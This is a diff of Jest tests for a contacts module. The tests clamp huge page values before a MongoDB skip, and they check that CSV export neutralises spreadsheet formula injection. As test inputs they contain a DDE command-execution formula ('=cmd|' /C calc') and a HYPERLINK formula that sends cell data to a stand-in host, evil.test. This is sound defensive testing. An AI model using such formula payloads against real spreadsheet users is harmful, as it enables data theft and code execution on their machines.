@@ -366,6 +366,18 @@ describe("listContacts", () => {
     const floor = await listContacts({ orgId: ORG, identity: true, page: -4, limit: 0 });
     expect(floor).toMatchObject({ page: 1, limit: 50 });
   });
+
+  test("an absurd page is clamped to a skip Mongo can represent, not passed through", async () => {
+    const stageOf = (key: string) => (aggregate.mock.calls.at(-1)![0] as unknown as Array<Record<string, unknown>>).find((s) => key in s)![key];
+
+    // `?page=1e21` used to reach Mongo as `$skip: 5e22`, which is not a 64-bit integer: the
+    // aggregate threw and a bad query parameter became a 500 instead of an empty page.
+    const far = await listContacts({ orgId: ORG, identity: true, page: 1e21, limit: 200 });
+    expect(far.page).toBe(1_000_000);
+    const skip = stageOf("$skip") as number;
+    expect(Number.isSafeInteger(skip)).toBe(true);
+    expect(skip).toBe(199_999_800);
+  });
 });
 
 describe("getContact and the note", () => {
@@ -441,6 +453,52 @@ describe("CSV", () => {
     expect(csvField('say "hi"')).toBe('"say ""hi"""');
     expect(csvField("line\nbreak")).toBe('"line\nbreak"');
     expect(csvField("cr\rhere")).toBe('"cr\rhere"');
+  });
+
+  test("csvField defuses a cell a spreadsheet would run as a formula", () => {
+    // Every name, address and tag in this file was typed by a reader at some point. RFC 4180
+    // quoting does not stop Excel or Sheets evaluating a leading =, + , - or @, so the value is
+    // prefixed with an apostrophe (which every spreadsheet reads as "this is text") and quoted.
+    expect(csvField("=1+1")).toBe(`"'=1+1"`);
+    expect(csvField("@SUM(A1)")).toBe(`"'@SUM(A1)"`);
+    expect(csvField("+1")).toBe(`"'+1"`);
+    expect(csvField("-1")).toBe(`"'-1"`);
+    expect(csvField("=A1")).toBe(`"'=A1"`);
+    expect(csvField("\t=A1")).toBe(`"'\t=A1"`);
+    expect(csvField("=cmd|' /C calc'!A0")).toBe(`"'=cmd|' /C calc'!A0"`);
+    // The real case exercises both branches at once: it starts a formula and carries the commas
+    // and quotes RFC 4180 has to escape anyway.
+    expect(csvField('=HYPERLINK("http://x/"&A2,"click")')).toBe(`"'=HYPERLINK(""http://x/""&A2,""click"")"`);
+    // A value that merely contains one of those characters is not a formula, and is left alone.
+    expect(csvField("a=b")).toBe("a=b");
+    expect(csvField("Nair-Smith")).toBe("Nair-Smith");
+    // Every numeric cell in a row is a count, so the `-` rule never reaches one.
+    expect(csvField(0)).toBe("0");
+    expect(csvField(42)).toBe("42");
+  });
+
+  test("a formula-shaped name reaches the file defused, in the row the export writes", () => {
+    const csv = contactsToCsv([
+      {
+        id: "1",
+        name: '=HYPERLINK("https://evil.test/?d="&B2&C2,"Open report")',
+        email: "priya@sequoiacap.com",
+        domain: "sequoiacap.com",
+        verified: false,
+        introduced: true,
+        firstSeenAt: T0.toISOString(),
+        lastSeenAt: T1.toISOString(),
+        documentsRead: 1,
+        projectsCount: 0,
+        visits: 1,
+        tags: [{ id: "a", name: "=A1", slug: "a1", color: "sky" }],
+        lastSource: { kind: "introduced", at: T1.toISOString() },
+      },
+    ]);
+    const row = csv.split("\r\n")[1];
+    expect(row.startsWith(`"'=HYPERLINK(`)).toBe(true);
+    expect(row).toContain(`"'=A1"`);
+    expect(row).not.toContain(",=A1");
   });
 
   test("the header is fixed and rows follow it, CRLF-terminated", () => {
